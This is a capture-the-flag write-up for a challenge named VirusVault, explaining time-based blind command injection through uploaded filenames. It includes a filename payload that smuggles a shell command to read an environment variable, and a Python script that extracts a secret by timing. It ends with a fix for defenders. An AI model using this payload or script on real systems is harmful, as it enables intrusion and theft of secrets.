# VirusVault — Write-up

**Category:** Blind Command Injection (Time-Based)  
**Flag:** offsec{REDACTED}

---

## Description

VirusVault is an online antivirus scanner. Users upload a file and receive a scan verdict. The backend processes the uploaded file server-side, and the filename is passed unsanitized to a shell command, but the output of injected commands is never reflected in the response, making this a **blind** injection.

---

## Analysis

Initial tests showed that the filename is passed to a shell command on the server. However:
- The output of injected commands is not reflected in the HTTP response
- The verdict page only shows clean/infected status

This rules out direct exfiltration and points to a **time-based blind injection**: instead of reading output, we measure the HTTP response time to infer the flag one character at a time.

---

## Exploit

The injected filename uses conditional `sleep` to signal whether a guessed character matches:

```
test$([ "$(printenv FLAG | cut -c1)" = "o" ] && sleep 5).txt
```

- If the character at position N matches the guess → `sleep 5` executes → response takes ~5s
- If it doesn't match → response is immediate

A Python script automates the extraction across the full charset (shortened version):

```python
import requests, string, time

URL = "https://<host>/scan"
DELAY = 5
charset = string.ascii_letters + string.digits + "{}_"

flag = ""
pos = 1
while True:
    for char in charset:
        filename = f'test$([ "$(printenv FLAG | cut -c{pos})" = "{char}" ] && sleep {DELAY}).txt'
        start = time.time()
        requests.post(URL, files={'specimen': (filename, b'test')})
        if time.time() - start >= DELAY:
            flag += char
            print(f"[+] pos {pos}: {char} → {flag}")
            pos += 1
            if char == '}':
                print(f"Flag: {flag}")
                exit()
            break
```

---

## Reliability Note

A fixed threshold can cause false positives under variable network latency. A more robust approach measures a baseline response time before starting and sets the threshold relative to it:

```python
baseline = mean of 3 normal requests
threshold = baseline + 4.0
```

---

## Lesson Learned

Blind command injection is harder to detect than reflected injection since no output ever appears in the response, but it is equally dangerous. The fix is the same: **never** pass user-controlled input (including filenames) to shell commands. Use safe APIs that accept argument lists instead of shell strings.